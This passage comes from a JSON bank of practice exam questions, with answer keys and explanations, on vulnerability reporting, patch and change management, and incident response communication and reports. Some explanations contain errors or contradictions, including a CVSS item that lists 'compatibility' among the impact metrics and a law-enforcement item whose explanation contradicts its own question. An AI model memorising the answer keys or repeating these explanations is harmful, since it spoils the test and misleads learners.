extremely careful with this patch. If the patch causes services to fail, it has the potential to disable all of his organization’s Windows servers. This is a serious risk and requires testing prior to patch deployment. Patrick’s best course of action is to deploy the patch in a test environment and then roll it out into production on a staged basis if that test is successful. Options that involve deploying the patch to production systems prior to testing may cause those services to fail. Disabling all external access to systems is likely an overreaction that would have critical business impact.","l":"c12-vuln-report","l2":"c6-remediation","k":"patch testing and rollout"},{"id":"d4-4","set":"d4","ch":6,"d":4,"q":"Ben is preparing to conduct a vulnerability scan for a new client of his security consulting organization. Which one of the following steps should Ben perform first?","o":["Conduct penetration testing.","Run a vulnerability evaluation scan.","Run a discovery scan.","Obtain permission for the scans."],"a":3,"e":"Ben should obtain permission from the client to perform scans before engaging in any other activities. Failure to do so may violate the law and/or anger the client.","l":"c6-requirements","l2":"","k":"vulnerability scanning permission"},{"id":"d4-5","set":"d4","ch":12,"d":4,"q":"Katherine coordinates the remediation of security vulnerabilities in her organization and is attempting to work with a system engineer on the patching of a server to correct a moderate impact vulnerability. The engineer is refusing to patch the server because of the potential interruption to a critical business process that runs on the server. What would be the most reasonable course of action for Katherine to take?","o":["Schedule the patching to occur during a regular maintenance cycle.","Exempt the server from patching because of the critical business impact.","Demand that the server be patched immediately to correct the vulnerability.","Inform the engineer that if he does not apply the patch within a week that Katherine will file a complaint with his manager."],"a":0,"e":"The fact that the server runs a critical business process should increase the importance of the patch, rather than deferring it indefinitely. Katherine should work with the engineer to schedule the patch to occur during a regular maintenance window. It is reasonable to wait until that scheduled window because of the relatively low impact of the vulnerability.","l":"c12-vuln-report","l2":"c6-remediation","k":"patching maintenance window"},{"id":"d4-6","set":"d4","ch":12,"d":4,"q":"Grace ran a vulnerability scan and detected an urgent vulnerability in a public-facing web server. This vulnerability is easily exploitable and could result in the complete compromise of the server. Grace wants to follow best practices regarding change control while also mitigating this threat as quickly as possible. What would be Grace’s best course of action?","o":["Initiate a high-priority change through her organization’s change management process and wait for the change to be approved.","Implement a fix immediately and document the change after the fact.","Schedule a change for the next quarterly patch cycle.","Initiate a standard change through her organization’s change management process."],"a":1,"e":"In this situation, Grace is facing a true emergency. Her web server has a critical vulnerability that is exposed to the outside world and may be easily exploited. Grace should correct the issue immediately, informing all relevant stakeholders of the actions that she is taking. She can then follow up by documenting the change as an emergency action in her organization’s change management process. All of the other approaches in this question introduce an unacceptable delay.","l":"c12-vuln-report","l2":"c8-controls","k":"emergency change management"},{"id":"d4-7","set":"d4","ch":12,"d":4,"q":"Joe discovered a critical vulnerability in his organization’s database server and received permission from his supervisor to implement an emergency change after the close of business. He has 8 hours before the planned change window. In addition to planning the technical aspects of the change, what else should Joe do to prepare for the change?","o":["Ensure that all stakeholders are informed of the planned outage.","Document the change in his organization’s change management system.","Identify any potential risks associated with the change.","All of the above."],"a":3,"e":"Joe has time to conduct some communication and change management before making the change. Even though this change is urgent, Joe should take advantage of that time to communicate with stakeholders, conduct a risk assessment, and initiate change management processes. These tasks will likely be abbreviated forms of what Joe would do if he had time to plan a change normally, but he should make every effort to complete them.","l":"c12-vuln-report","l2":"c8-controls","k":"emergency change preparation"},{"id":"d4-8","set":"d4","ch":12,"d":4,"q":"Sally discovered during a vulnerability scan that a system she manages has a high-priority vulnerability that requires a patch. The system is behind a firewall and there is no imminent threat, but Sally wants to get the situation resolved as quickly as possible. What would be her best course of action?","o":["Initiate a high-priority change through her organization’s change management process.","Implement a fix immediately and then document the change after the fact.","Implement a fix immediately and then inform her supervisor of her action and the rationale.","Schedule a change for the next quarterly patch cycle."],"a":0,"e":"In this situation, Sally recognizes that there is no imminent threat, so it is not necessary to follow an emergency change process that would allow her to implement the change before conducting any change management. That said, the change should be made without waiting up to 3 months for a scheduled patch cycle. Therefore, Sally’s best option is to initiate a high-priority change through her organization’s change management process.","l":"c12-vuln-report","l2":"c8-controls","k":"change management prioritization"},{"id":"d4-9","set":"d4","ch":6,"d":4,"q":"Gene runs a vulnerability scan of his organization’s datacenter and produces a summary report to share with his management team. The report includes the chart shown here. When Gene’s manager reads the report, she points out that the report is burying important details because it is highlighting too many unimportant issues. What should Gene do to resolve this issue?<figure><img alt=\"Bar chart depicts vulnerabilities by severity level with 5 bars peaking at 85 for severity 2, lowest at 1 for severity 4, and total of 115.\" loading=\"lazy\" src=\"img/pt/c04un001.png\"/></figure>","o":["Tell his manager that all vulnerabilities are important and should appear on the report.","Create a revised version of the chart using Microsoft Excel.","Modify the sensitivity level of the scan.","Stop sharing reports with the management team."],"a":2,"e":"Gene’s best option is to alter the sensitivity level of the scan so that it excludes low-importance vulnerabilities. The fact that his manager is telling him that many of the details are unimportant is his cue that the report contains superfluous information. Although he could edit the chart manually, he should instead alter the scan settings so that he does not need to make those manual edits each time he runs the report.","l":"c6-config","l2":"","k":"vulnerability scan sensitivity level"},{"id":"d4-10","set":"d4","ch":6,"d":4,"q":"Glenda routinely runs vulnerability scans of servers in her organization. She is having difficulty with one system administrator who refuses to correct vulnerabilities on a server used as a jump box by other IT staff. The server has had dozens of vulnerabilities for weeks and would require downtime to repair. One morning, her scan reports that all of the vulnerabilities suddenly disappeared overnight, while other systems in the same scan are reporting issues. She checks the service status dashboard, and the service appears to be running properly with no outages reported in the past week. What is the most likely cause of this result?","o":["The system administrator corrected the vulnerabilities.","The server is down.","The system administrator blocked the scanner.","The scan did not run."],"a":2,"e":"Although any of these reasons are possible, the most likely cause of this result is that the system administrator blocked the scanner with a host firewall rule. It is unlikely that the administrator completed the lengthy, time-consuming work overnight and without causing a service disruption. If the server were down, other IT staff would have reported the issue. If the scan did not run, Glenda would not see any entries in the scanner’s logs.","l":"c6-config","l2":"c1-network","k":"vulnerability scan host firewall blocking"},{"id":"d4-11","set":"d4","ch":12,"d":4,"q":"Tom is planning a series of vulnerability scans and wants to ensure that the organization is meeting its customer commitments with respect to the scans’ performance impact. What two documents should Tom consult to find these obligations?","o":["SLAs and MOUs","SLAs and DRPs","DRPs and BIAs","BIAs and MOUs"],"a":0,"e":"Tom should consult service level agreements (SLAs) and memorandums of understanding (MOUs). These documents should contain all commitments made to customers related to performance. Disaster recovery plans (DRPs) and business impact assessments (BIAs) should not contain this type of information.","l":"c12-vuln-report","l2":"","k":"service level agreements SLAs"},{"id":"d4-12","set":"d4","ch":12,"d":4,"q":"Zhang Wei is evaluating the success of his vulnerability management program and would like to include some metrics. Which one of the following would be the <i>least</i> useful metric?","o":["Time to resolve critical vulnerabilities","Number of open critical vulnerabilities over time","Total number of vulnerabilities reported","Number of systems containing critical vulnerabilities"],"a":2,"e":"Zhang Wei should likely focus his efforts on high-priority vulnerabilities, as vulnerability scanners will report results for almost any system scanned. The time to resolve critical vulnerabilities, the number of open critical vulnerabilities over time, and the number of systems containing critical vulnerabilities are all useful metrics. The total number of reported vulnerabilities is less useful because it does not include any severity information.","l":"c12-vuln-report","l2":"","k":"vulnerability management metrics"},{"id":"d4-13","set":"d4","ch":12,"d":4,"q":"Donna is working with a system engineer who wants to remediate vulnerabilities in a server that he manages. Of the report templates shown here, which would be most useful to the engineer?<figure><img alt=\"Screenshot lists 8 vulnerability report titles and data sources with type icons indicating scan-based and host-based data for each title.\" loading=\"lazy\" src=\"img/pt/c04un002.png\"/></figure>","o":["Qualys Top 20 Report","PCI Technical Report","Executive Report","Technical Report"],"a":3,"e":"The Technical Report will contain detailed information on a specific host and is designed for an engineer seeking to remediate the system. The PCI Technical Report would focus on credit card compliance issues, and there is no indication that this server is used for credit card processing. The Qualys Top 20 Report and Executive Report would contain summary information more appropriate for a management audience and cover an entire network, rather than provide detailed information on a single system.","l":"c12-vuln-report","l2":"","k":"technical vulnerability report"},{"id":"d4-14","set":"d4","ch":12,"d":4,"q":"Abdul received the vulnerability report shown here for a server in his organization. The server runs a legacy application that cannot easily be updated. What risks does this vulnerability present?<figure><img alt=\"Screenshot shows unauthenticated F T P server access with first and last detection details for C V S S base score 7.8 and 36 times detected.\" loading=\"lazy\" src=\"img/pt/c04un003.png\"/></figure>","o":["Unauthorized access to files stored on the server","Theft of credentials","Eavesdropping on communications","All of the above"],"a":3,"e":"The use of FTP is not considered a good security practice. Unless tunneled through a secure protocol, FTP is unencrypted, allowing an attacker to eavesdrop on communications and steal credentials that may be transmitted over FTP links. Additionally, this vulnerability indicates that an attacker can gain access to the server without even providing valid credentials.","l":"c12-vuln-report","l2":"c7-server-network","k":"FTP unencrypted vulnerability remediation"},{"id":"d4-15","set":"d4","ch":12,"d":4,"q":"William is preparing a legal agreement for his organization to purchase services from a vendor. He would like to document the requirements for system availability, including the vendor’s allowable downtime for patching. What type of agreement should William use to incorporate this requirement?","o":["MOU","SLA","BPA","BIA"],"a":1,"e":"Service level agreements (SLAs) specify the technical parameters of a vendor relationship and should include coverage of service availability as well as remedies for failure to meet the agreed-on targets. Memorandums of understanding (MOUs) are less formal documents that outline the relationship between two organizations. Business partnership agreements (BPAs) typically cover business, rather than technical, issues and would not normally include availability commitments. Business impact analysis (BIA) documents are risk assessments and are not legal agreements.","l":"c12-vuln-report","l2":"","k":"service level agreement SLA"},{"id":"d4-16","set":"d4","ch":6,"d":4,"q":"Raul is replacing his organization’s existing vulnerability scanner with a new product that will fulfill that functionality moving forward. As Raul begins to build the policy, he notices some conflicts in the scanning settings between different documents. Which one of the following document sources should Raul give the highest priority when resolving these conflicts?","o":["NIST guidance documents","Vendor best practices","Corporate policy","Configuration settings from the prior system"],"a":2,"e":"Of the documents listed, only corporate policy is binding on Raul, and he should ensure that his new system’s configuration complies with those requirements. The other sources may provide valuable information to inform Raul’s work, but compliance with them is not mandatory.","l":"c6-requirements","l2":"c8-governance","k":"vulnerability management corporate policy"},{"id":"d4-17","set":"d4","ch":12,"d":4,"q":"Pietro is responsible for distributing vulnerability scan reports to system engineers who will remediate the vulnerabilities. What would be the most effective and secure way for Pietro to distribute the reports?","o":["Pietro should configure the reports to generate automatically and provide immediate, automated notification to administrators of the results.","Pietro should run the reports manually and send automated notifications after he reviews them for security purposes.","Pietro should run the reports on an automated basis and then manually notify administrators of the results after he reviews them.","Pietro should run the reports manually and then manually notify administrators of the results after he reviews them."],"a":0,"e":"There is no reasonable justification for Pietro reviewing the reports prior to providing them to the administrators responsible for the systems. In the interests of transparency and efficiency, he should configure the scans to run automatically and send automated notifications to administrators as soon as they are generated. This approach allows immediate remediation. There is nothing preventing Pietro from performing a review of the scan results, but he should not filter them before providing them to the responsible engineers.","l":"c12-vuln-report","l2":"","k":"automated vulnerability report distribution"},{"id":"d4-18","set":"d4","ch":12,"d":4,"q":"Nitesh would like to identify any systems on his network that are not registered with his asset management system because he is concerned that they might not be remediated to his organization’s current security configuration baseline. He looks at the reporting console of his vulnerability scanner and sees the options shown here. Which of the following report types would be his best likely starting point?<figure><img alt=\"Screenshot lists 8 vulnerability report titles and data sources with type icons indicating scan-based and host-based data for each title.\" loading=\"lazy\" src=\"img/pt/c04un004.png\"/></figure>","o":["Technical Report","High Severity Report","Qualys Patch Report","Unknown Device Report"],"a":3,"e":"The Unknown Device Report will focus on systems detected during the scan that are not registered with the organization’s asset management system. The High Severity Report will provide a summary of critical security issues across all systems. The Technical Report will likely contain too much detail and may not call out unknown systems. The Patch Report will indicate systems and applications that are missing patches but not necessarily identify unknown devices.","l":"c12-vuln-report","l2":"c5-portscan","k":"unknown device report"},{"id":"d4-19","set":"d4","ch":12,"d":4,"q":"Nabil is the vulnerability manager for his organization and is responsible for tracking vulnerability remediation. There is a critical vulnerability in a network device that Nabil has handed off to the device’s administrator, but it has not been resolved after repeated reminders to the engineer. What should Nabil do next?","o":["Threaten the engineer with disciplinary action.","Correct the vulnerability himself.","Mark the vulnerability as an exception.","Escalate the issue to the network administrator’s manager."],"a":3,"e":"The scenario does not indicate that Nabil has any operational or managerial control over the device or the administrator, so his next step should be to escalate the issue to an appropriate manager for resolution. Nabil should not threaten the engineer because there is no indication that he has the authority to do so. Nabil cannot correct the vulnerability himself because he should not have administrative access to network devices as a vulnerability manager. He should not mark the vulnerability as an exception because there is no indication that it was accepted through a formal exception process.","l":"c12-vuln-report","l2":"","k":"vulnerability remediation escalation"},{"id":"d4-20","set":"d4","ch":12,"d":4,"q":"Maria discovered an operating system vulnerability on a system on her network. After tracing the IP address, she discovered that the vulnerability is on a proprietary search appliance installed on her network. She consulted with the responsible engineer who informed her that he has no access to the underlying operating system. What is the best course of action for Maria?","o":["Contact the vendor to obtain a patch.","Try to gain access to the underlying operating system and install the patch.","Mark the vulnerability as a false positive.","Wait 30 days and rerun the scan to see whether the vendor corrected the vulnerability."],"a":0,"e":"Maria should contact the vendor to determine whether a patch is available for the appliance. She should not attempt to modify the appliance herself, as this may cause operational issues. Maria has no evidence to indicate that this is a false positive report, and there is no reason to wait 30 days to see whether the problem resolves itself.","l":"c12-vuln-report","l2":"","k":"third party vendor patch management"},{"id":"d4-21","set":"d4","ch":12,"d":4,"q":"Thomas is working with an application team on the remediation of a critical SQL injection vulnerability in a public-facing service. The team is concerned that deploying the fix will require several hours of downtime and will block customer transactions from completing. What is the most reasonable course of action for Thomas to suggest?","o":["Wait until the next scheduled maintenance window.","Demand that the vulnerability be remediated immediately.","Schedule an emergency maintenance for an off-peak time later in the day.","Convene a working group to assess the situation."],"a":2,"e":"This is a critical vulnerability in a public-facing service and should be patched urgently. However, it is reasonable to schedule an emergency maintenance for the evening and inform customers of the outage several hours in advance to avoid business process interruption. Therefore, Thomas should immediately begin monitoring affected systems for signs of compromise and work with the team to schedule maintenance for as soon as possible.","l":"c12-vuln-report","l2":"c7-web-ot","k":"critical vulnerability emergency patching"},{"id":"d4-22","set":"d4","ch":12,"d":4,"q":"Thomas discovers a vulnerability in a web application that is part of a proprietary system developed by a third-party vendor, and he does not have access to the source code. Which one of the following actions can he take to mitigate the vulnerability without involving the vendor?","o":["Apply a patch.","Update the source code.","Deploy a web application firewall.","Conduct dynamic testing."],"a":2,"e":"Thomas can deploy a web application firewall to block attempts to exploit the vulnerability. Applying a patch or updating the source code may also resolve the issue, but Thomas cannot do this himself because he does not have access to the source code. Dynamic testing identifies vulnerabilities but does not correct them.","l":"c12-vuln-report","l2":"c7-web-ot","k":"compensating control web application firewall"},{"id":"d4-23","set":"d4","ch":12,"d":4,"q":"Walt is designing his organization’s vulnerability management program and is working to identify potential inhibitors to vulnerability remediation. He has heard concern from functional leaders that remediating vulnerabilities will impact the ability of a new system to fulfill user requests. Which one of the following inhibitors does not apply to this situation?","o":["Degrading functionality","Organizational governance","Legacy systems","Business process interruption"],"a":2,"e":"Walt finds himself in a very common situation, with business leaders worried about the impact of vulnerability remediation on their activities. The business leaders are concerned about business process interruption and degrading functionality. This could be best resolved with a robust organizational governance process. The system in question is newly deployed, so it is not an example of a legacy system.","l":"c12-vuln-report","l2":"","k":"remediation inhibitors legacy systems"},{"id":"d4-24","set":"d4","ch":12,"d":4,"q":"The company that Brian works for processes credit cards and is required to be compliant with PCI DSS. If Brian’s company experiences a breach of card data, what type of disclosure will they be required to provide?","o":["Notification to local law enforcement","Notification to their acquiring bank","Notification to federal law enforcement","Notification to Visa and MasterCard"],"a":1,"e":"Organizations that process credit cards work with acquiring banks to handle their card processing, rather than directly with the card providers. Notification to the bank is part of this type of response effort. Requiring notification of law enforcement is unlikely, and the card provider listing specifies only two of the major card vendors, none of which are specified in the question.","l":"c12-ir-report","l2":"c6-requirements","k":"PCI DSS breach reporting"},{"id":"d4-25","set":"d4","ch":12,"d":4,"q":"As Ava prepares her organization’s security practices and policies, she wants to address as many threat vectors as she can using an awareness program. Which of the following threats can be most effectively dealt with via awareness?","o":["Attrition","Impersonation","Improper usage","Web"],"a":2,"e":"Improper usage, which results from violations of an organization’s acceptable use policies by authorized users, can be reduced by implementing a strong awareness program. This will help ensure users know what they are permitted to do and what is prohibited. Attrition attacks focus on brute-force methods of attacking services. Impersonation attacks include spoofing, on-path/intermediary-in-the-middle attacks, and similar threats. Finally, web-based attacks focus on websites or web applications. Awareness may help with some specific web-based attacks like fake login sites, but many others would not be limited by Ava’s awareness efforts.","l":"c12-vuln-report","l2":"c12-ir-report","k":"security awareness training improper usage"},{"id":"d4-26","set":"d4","ch":12,"d":4,"q":"Laura wants to ensure that her team can communicate during an incident. Which of the following should the team prepare to be ready for an incident?","o":["A second, enterprise authenticated messaging system","An enterprise VoIP system using encryption","Enterprise email with TLS enabled","A messaging capability that can function if enterprise authentication is unavailable"],"a":3,"e":"A distinct messaging system that can work if enterprise services are unavailable due to an incident can be a critical factor for IR teams. Whether it’s a phone tree, a collaboration system that also allows distinct logins that are not part of enterprise authentication, or another solution, IR teams often need a system that is separate during wide-ranging incidents.","l":"c12-ir-report","l2":"c9-foundation","k":"out of band communications"},{"id":"d4-27","set":"d4","ch":12,"d":4,"q":"Which of the following is not an important part of the incident response communication process?","o":["Limiting communication to trusted parties","Disclosure based on public feedback","Using a secure method of communication","Preventing accidental release of incident-related information"],"a":1,"e":"Disclosure based on regulatory or legislative requirements is commonly part of an incident response process; however, public feedback is typically a guiding element of information release. Limiting communication to trusted parties and ensuring that data and communications about the incident are properly secured are both critical to the security of the incident response process. This also means that responders should work to limit the potential for accidental release of incident-related information.","l":"c12-ir-report","l2":"","k":"incident communication requirements"},{"id":"d4-28","set":"d4","ch":12,"d":4,"q":"After law enforcement was called because of potential criminal activity discovered as part of a forensic investigation at Joe’s company, the officers on the scene seized three servers. When can Joe expect his servers to be returned?","o":["After 30 days, which provides enough time for a reasonable imaging process","After 6 months, as required by law","After 1 year, as most cases resolve in that amount of time","Joe should not plan on a time frame for return"],"a":3,"e":"Criminal investigations can take very long periods of time to resolve. In most cases, Joe should ensure that he can continue to operate without the servers for the foreseeable future.","l":"c12-ir-report","l2":"c10-evidence","k":"law enforcement evidence seizure"},{"id":"d4-29","set":"d4","ch":12,"d":4,"q":"Chuck’s organization has prepared draft customer communications as part of their incident response plan. Why is this considered a useful practice?","o":["It prevents malicious actors from changing customer communications.","It ensures compliance requirements are met.","It speeds up communications in many cases.","It avoids the need to engage police."],"a":2,"e":"Having prewritten communications prepared in case of incidents helps organizations to speed up their communication process. Malicious actors typically don’t target this type of customer communications, and pre-drafting them might allow attackers to modify the drafts. Drafting communications or building templates that include compliance requirements can help make sure compliance requirements are met, but simply drafting them ahead of time does not ensure compliance. The decision to engage law enforcement is not driven by communications.","l":"c12-ir-report","l2":"c9-foundation","k":"incident communication templates"},{"id":"d4-30","set":"d4","ch":12,"d":4,"q":"Ben works at an organization that is required under U.S. law to report HIPAA breaches. Which of the following is not a typical requirement of this type of notification requirement?","o":["Notifying impacted individuals","Notifying law enforcement","Notifying the media","Notifying the reporting agency"],"a":1,"e":"While reporting requirements vary, notifying impacted individuals and the reporting agency are common requirements. HIPAA also requires notification of the media under some circumstances, but does not require notifying law enforcement. If you’re faced with a question like this and aren’t familiar with the specific compliance requirement it can help to consider why the requirement might exist. Here it is to ensure that impacted individuals are more likely to be aware of the breach, and HIPAA requires it if more than 500 residents of a state or jurisdiction are impacted.","l":"c12-ir-report","l2":"","k":"HIPAA breach notification requirements"},{"id":"d4-31","set":"d4","ch":12,"d":4,"q":"Which of the following organizations is not typically involved in post-incident communications?","o":["Developers","Marketing","Public relations","Legal"],"a":0,"e":"Post-incident communication often involves marketing and public relations staff who focus on consumer sentiment and improving the organization’s image, whereas legal often reviews statements to limit liability or other issues. Developers are typically not directly involved in post-incident communications and are instead working on ensuring the security of the applications or systems they are responsible for.","l":"c12-ir-report","l2":"","k":"incident communication stakeholders"},{"id":"d4-32","set":"d4","ch":12,"d":4,"q":"Tom is building his incident response team and is concerned about how the organization will address insider threats. Which business function would be most capable of assisting with the development of disciplinary policies?","o":["Information security","Human resources","Legal counsel","Senior management"],"a":1,"e":"Although all of these functions are likely able to provide important advice on disciplinary policies, the human resources team has primary responsibility for employee relations and would be the best team to include for this purpose.","l":"c12-ir-report","l2":"c9-foundation","k":"incident response team HR role"},{"id":"d4-33","set":"d4","ch":12,"d":4,"q":"Craig is revising his organization’s incident response plan and wants to ensure that the plan includes coordination with all relevant internal and external entities. Which one of the following stakeholders should he be most cautious about coordinating with?","o":["Regulatory bodies","Senior leadership","Legal","Human resources"],"a":0,"e":"All of these stakeholders should be included in the planning for an incident response program. However, Craig should be most careful about coordinating with external entities, such as regulatory bodies, because of their enforcement role. He should plan to coordinate more freely with internal entities, such as senior leadership, legal, and human resources.","l":"c12-ir-report","l2":"","k":"regulatory reporting coordination"},{"id":"d4-34","set":"d4","ch":12,"d":4,"q":"The vulnerability management action plan that was sent to Jacinda notes that a critical application that her organization uses relies on an insecure version of a software package because of a long-standing workflow requirement. Jacinda’s organization’s best practices state that the organization will select the most secure option that also permits business to be conducted. What should Jacinda do?","o":["Mark the vulnerability as “ignored.”","Change the business requirements to enable the vulnerability to be handled.","Disable the service.","Install a third-party patch for the service."],"a":1,"e":"Jacinda knows that reviewing business processes to see if they can be changed to use a secure version of the software package may require some business process changes but is often a possible solution. Ignoring the vulnerability isn’t secure, turning off the service will disrupt the business itself, and third-party patches rarely exist and are seldom a preferred solution.","l":"c12-vuln-report","l2":"","k":"vulnerability management action plans"},{"id":"d4-35","set":"d4","ch":12,"d":4,"q":"What section of an incident response report provides a brief, clear summary of the incident, response activities, and current state of the incident?","o":["The timeline","The scope statement","The executive summary","The documentation of evidence"],"a":2,"e":"Executive summaries are brief, clear, and focused on conveying the important elements of the IR report. They are typically found at the beginning of the report and are intended to allow leaders and others who read the report to quickly grasp and understand the content of the report.","l":"c12-ir-report","l2":"","k":"incident report executive summary"},{"id":"d4-36","set":"d4","ch":12,"d":4,"q":"Ian wants to prepare his organization for communications with the media as part of incident related public relations. What should he recommend that his organization do to prepare?","o":["Build a list of phrases and topics to avoid.","Hire a reputation defense firm.","Engage legal counsel.","Conduct media training."],"a":3,"e":"Ian knows that media training is a common preparedness item for organizations that may have to respond to the media in the event of an incident. Building a list of phrases and topics to avoid is difficult before an incident and can be problematic if it becomes public. Engaging either legal counsel or a reputation defense firm does not prepare the organization itself for engaging with the media but may be part of post or during the incident activities if the organization feels it to be necessary.","l":"c12-ir-report","l2":"c9-foundation","k":"media communications training"},{"id":"d4-37","set":"d4","ch":12,"d":4,"q":"Jason is required to notify the company that provides credit card processing services to his organization if an incident impacting credit card data occurs. What type of communications does he need to perform?","o":["Regulatory reporting","Customer communications","Law enforcement communications","None of the above"],"a":3,"e":"Payment card industry requirements contractual, not regulatory. Jason’s organization is the customer, and law enforcement communication is not required by PCI.","l":"c12-ir-report","l2":"c6-requirements","k":"contractual incident notification"},{"id":"d4-38","set":"d4","ch":12,"d":4,"q":"The incident response report that Kathleen has prepared includes the following statement:\n<p>“Unnecessary services including HTTP and FTP should be disabled on all devices of this type that are deployed.”</p>\n<p>What incident response reporting component will most commonly include this type of statement?</p>","o":["Scope","Executive summary","Recommendations","Timeline"],"a":2,"e":"The recommendations section of an incident response report will have specific suggestions for changes that will help prevent or limit the impact of future incidents. This statement provides more detail than would typically be found in an executive summary. Timelines specify when something happened but don’t make recommendations, and scope detail provides information about the scale and impacted systems or services from an incident.","l":"c12-ir-report","l2":"","k":"incident report recommendations"},{"id":"d4-39","set":"d4","ch":7,"d":4,"q":"What common score is used to help with prioritization of vulnerability remediation in many organizations?","o":["CVE","ATT&amp;CK","CVSS","PASTA"],"a":2,"e":"The Common Vulnerability Scoring System (CVSS) score provides a numerical score that reflects the severity of a vulnerability and is thus useful for prioritization. Common vulnerabilities and exposures (CVE) provides a way to identify and catalog vulnerabilities. ATT&amp;CK is a framework used to define adversarial tactics and techniques, and PASTA is a threat modeling process.","l":"c7-cvss","l2":"c12-vuln-report","k":"CVSS vulnerability prioritization"},{"id":"d4-40","set":"d4","ch":12,"d":4,"q":"Olivia has been notified that a vulnerability has recurred on a server after being marked as remediated through a compensating control by an administrator. Which of the following is the most likely reason that a vulnerability may recur in this circumstance?","o":["An attacker has removed the patch to expose the vulnerability.","The system has been reinstalled by the administrator.","A patch has caused the compensating control to fail.","The service has been reenabled by a user."],"a":2,"e":"A common scenario for compensating controls and work-arounds is that a follow-up patch causes the fix to no longer work. This may be because settings are changed or because the service or system has been modified in ways the compensating control did not anticipate. It is less likely that an attacker would remove a patch, or that the system would be reinstalled without reapplying the remediation, and in most environments, users should not be able to change server configurations.","l":"c12-vuln-report","l2":"","k":"vulnerability recurrence compensating control"},{"id":"d4-41","set":"d4","ch":12,"d":4,"q":"The incident response report that Brian is reading includes a statement that says, “Impacted systems were limited to those in the organization’s AWS VPC.” What part of an incident response report will typically contain this type of information?","o":["The timeline","The evidence statement","The impact statement","The scope statement"],"a":3,"e":"Scope statements are used to explain and define which systems, services, or infrastructure components were part of an incident. Timelines are used to show when events occurred in relation to each other. Evidence is provided as part of a report to show what was found and how it was interpreted. Impact statements describe what the incident’s results or outcomes were for the organization.","l":"c12-ir-report","l2":"","k":"incident report scope statement"},{"id":"d4-42","set":"d4","ch":12,"d":4,"q":"Nila’s incident response team has discovered evidence of an employee who may have been engaged in criminal activity while they were conducting an incident investigation. The team has suggested that law enforcement should be contacted. What significant concern should Nila raise about this potential communication?","o":["Law enforcement can’t enforce organizational policy.","Law enforcement engagement may hinder the organization’s ability to respond or operate.","Law enforcement involvement may create communications issues.","Law enforcement may arrest a critical employee."],"a":1,"e":"Since the violation is only an organizational policy, Nila should note that law enforcement engagement may hinder the organization’s ability to respond or operate. Law enforcement isn’t being asked to enforce organizational policy, the more pressing issue is interruption of business instead of communications issues, and if the employee violated the law an arrest may happen anyway.","l":"c12-ir-report","l2":"","k":"law enforcement engagement risks"},{"id":"d4-43","set":"d4","ch":12,"d":4,"q":"Sameer wants to establish and track a metric for his organization that will help him know if his IoC monitoring processes are working well. Which of the following metrics is best suited to determining if IoCs are being effectively captured and analyzed?","o":["Mean time to detect","Mean time to respond","Mean time to remediate","Mean time to compromise"],"a":0,"e":"Sameer knows that mean time to detect should be lower if IoCs are being effectively captured, correlated, and analyzed. Mean time to respond measures the time from detection to assessing the event as an incident and activating the process. Mean time to remediate is a much more complex measure to provide a metric for since each incident’s size, scope, and complexity will all influence the mean time to remediate. This metric requires more nuanced communication and explanation than a simple number on a report in many cases and may benefit from granular reporting describing types of incidents as well as their impact and scope. Mean time to compromise is not a metric defenders will typically track.","l":"c12-ir-report","l2":"","k":"mean time to detect MTTD"},{"id":"d4-44","set":"d4","ch":12,"d":4,"q":"Sameer is continuing to improve his metrics to report to his organization’s board of directors. The board has requested that he include alert volumes in his reporting. What issue should Sameer discuss with the board after receiving this request?","o":["High-alert volumes indicate poor incident response processes.","Low-alert volumes indicate effective incident response processes.","Alert volume is not an effective security metric.","Alert volume requires other measures like number of patches installed to be an effective security metric."],"a":2,"e":"Alert volume is not an effective security metric because it is highly impacted by tuning as well as external factors like the number of probes and attacks. High-alert volumes don’t indicate a poor incident response process but may indicate poor tuning or a high number of events. Low-alert volumes may similarly indicate poor tuning or events that are not being detected. Correlating the number of patches with alert volume does not produce a useful metric.","l":"c12-ir-report","l2":"","k":"incident response alert volume metric"},{"id":"d4-45","set":"d4","ch":12,"d":4,"q":"What important incident response report section relies heavily on NTP to be successful?","o":["The executive summary","The recommendations","The timeline","The scope statement"],"a":2,"e":"Network Time Protocol (NTP) is used to synchronize clocks and thus keeps log entries set to the proper time. Without synchronized time between systems, log entries can be extremely difficult to correlate, and timelines are difficult to build properly.","l":"c12-ir-report","l2":"c2-logging","k":"incident report timeline NTP"},{"id":"d4-46","set":"d4","ch":12,"d":4,"q":"What type of agreement between two organizations is a common inhibitor to remediation because of uptime requirements?","o":["An NDA","An SLA","A TLA","A KPI"],"a":1,"e":"Service level agreements (SLAs) often have uptime requirements included in their metrics and measures. Since patching may require systems or services to be offline, an SLA is a common inhibitor to remediation. Nondisclosure agreements (NDAs) and key performance indicators (KPIs) are not common inhibitors to remediation, and a TLA is just a “three-letter acronym”!","l":"c12-vuln-report","l2":"","k":"SLA remediation inhibitor"},{"id":"d4-47","set":"d4","ch":7,"d":4,"q":"Valerie needs to explain CVSS score metrics to her team. Which of the following is not part of the basic metric group for CVSS scores?","o":["The attack vector","The maturity of the exploit code","The attack complexity","The privileges required"],"a":1,"e":"The basic metric group for CVSS includes the attack vector, the attack complexity, the privileges required, user interaction, and four impact metrics: compatibility, integrity, availability, and scope. The maturity of exploit code is part of the temporal metric group, not the basic metric group.","l":"c7-cvss","l2":"","k":"CVSS basic metric group"},{"id":"d4-48","set":"d4","ch":12,"d":4,"q":"The scientific instrument that Chas is responsible for has multiple critical severity vulnerabilities in its operating system and services. The device cannot be patched according to instructions from the vendor who provides it. Which of the following is not an appropriate compensating control in this scenario?","o":["Place a network security device configured to prevent access to the system between the instrument and the network.","Install vendor patches against recommendations.","Disable network connectivity to the device.","Place the device on a protected network segment."],"a":1,"e":"Patching against vendor recommendations is the only control on this list that does not meet business requirements. Using a firewall device, disabling network connectivity, and moving the device to an isolated and secure network segment are all common compensating controls in this type of scenario.","l":"c12-vuln-report","l2":"c7-web-ot","k":"critical infrastructure compensating controls"},{"id":"d4-49","set":"d4","ch":12,"d":4,"q":"Hui’s incident response report includes log entries showing that a user logged in from another country, despite living and working in the country that the company Hui works for is located in. What incident response report section is most likely to contain this type of information?","o":["The impact section","The scope section","The evidence section","The timeline section"],"a":2,"e":"Log entries showing logins from a country where the employee does not work or reside are an example of evidence that may be included in an incident response report.","l":"c12-ir-report","l2":"","k":"incident report evidence section"},{"id":"d4-50","set":"d4","ch":12,"d":4,"q":"Melissa is conducting a root-cause analysis. Which of the following is not a common step in RCA processes?","o":["Identify problems and events.","Establish a timeline.","Differentiate causal factors and the root cause.","Implement compensating controls."],"a":3,"e":"The four stages of RCA are identifying problems and events that occurred as part of the incident, establishing a timeline of events, differentiating between the events and causal factors, and documenting the root-cause analysis. Root-cause analyses result in a report, which may then be used as part of preparation processes where compensating controls may 